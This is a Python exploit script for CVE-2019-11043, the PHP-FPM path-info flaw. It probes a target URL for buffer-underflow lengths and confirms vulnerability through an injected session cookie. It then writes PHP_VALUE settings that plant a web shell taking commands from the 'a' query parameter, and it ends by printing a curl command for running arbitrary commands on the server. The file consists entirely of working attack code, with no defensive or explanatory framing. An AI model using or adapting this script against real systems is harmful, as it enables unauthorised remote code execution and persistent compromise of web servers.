import requests, argparse, sys

def inlineopts():
	""" Parsing command args """
	parser = argparse.ArgumentParser()

	parser.add_argument(    "--url",
		help='Target URL (ex: http://localhost/index.php)',
		type=str,
		required=True)

	parser.add_argument(    "--verbose",
		help='show verbose output',
		action="store_true",
		required=False)

	return parser.parse_args()

opt = inlineopts()

php_settings = [
	"short_open_tag=1;;;;;;;",
	"html_errors=0;;;;;;;;;;",
	"include_path=/tmp;;;;;;",
	"auto_prepend_file=a;;;;",
	"log_errors=1;;;;;;;;;;;",
	"error_reporting=2;;;;;;",
	"error_log=/tmp/a;;;;;;;",
	"extension_dir=%22%3C%3F=%60%22;;;",
	"extension=%22$_GET%5Ba%5D%60%3F%3E%22",
]

rce_command = "a=/bin/sh+-c+'which+which'"
rce_check = "bin/which"

query_string_length = []
header_value_length = 1

orig = requests.get(opt.url)

for x in range(1700,1800):
	res = requests.get(opt.url+"/PHP%0Ainfooooooooooooooooooo.php?"+("U"*x))
	if res.status_code >= 500:
		if opt.verbose:
			print("(debug) qsl:"+str(x)+" status:"+str(res.status_code))
		query_string_length.append(x)

qsl_list = [(query_string_length[-1]-10), (query_string_length[-1]-5), query_string_length[-1]]
print("[*] QSL candidate: "+", ".join(str(x) for x in qsl_list))

r = True
for qslnum in qsl_list:
	while r:
		res = requests.get(opt.url+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("U"*qslnum), headers={"User-Agent":"CVE-2019-11043","M-iddle":("A"*header_value_length), "Ebut":"mamashu tvoyu"})

		if opt.verbose:
			print("(debug) Test headers value length: "+str(header_value_length));

		if "Set-Cookie" in res.headers and "PHPSESSID" in res.headers["Set-Cookie"]:
			print("[*] Target seems vulnerable: "+res.headers["Set-Cookie"])

			def_hvl = header_value_length
			r = False
			break

		header_value_length = (header_value_length+1)

		if header_value_length > 1000:
			print("[*] Target not vulnerable or something goes wrong...")
			sys.exit()

	if r is False:
		break

if opt.verbose:
	print("(debug) HVL:"+str(def_hvl));

for qslnum in qsl_list:
	res = requests.get(opt.url+"/PHP_VALUE%0Asession.auto_start=0;;;?"+("Q"*qslnum), headers={"User-Agent":"CVE-2019-11043","M-iddle":("A"*def_hvl), "Ebut":"qazxs edcvf"})

if def_hvl is not None:
	for zz in range(qsl_list[0],(qsl_list[-1])):
		for setting in php_settings:
			hhvalnew = def_hvl
			intremove = (len(setting)+4)

			if opt.verbose:
				print("Inject> QSL:"+str(zz-intremove)+" HVL:"+str(hhvalnew)+" setting:"+setting);

			res = requests.get(opt.url+"/PHP_VALUE%0A"+setting+"?"+rce_command+"&"+("Q"*(zz-intremove)), headers={"User-Agent":"CVE-2019-11043","M-iddle":("A"*hhvalnew), "Ebut":"qazxs edcvf"})

			if rce_check in res.text:
				print(
						"[*] RCE successfully exploited!\n\n"+\
						"    You should be able to run commands using:\n"+\
						"    curl "+opt.url+"?a=bin/ls+/\n"
				)

				sys.exit()

			if opt.verbose:
				print("----------------------")
				print(res.text)
				print("----------------------")
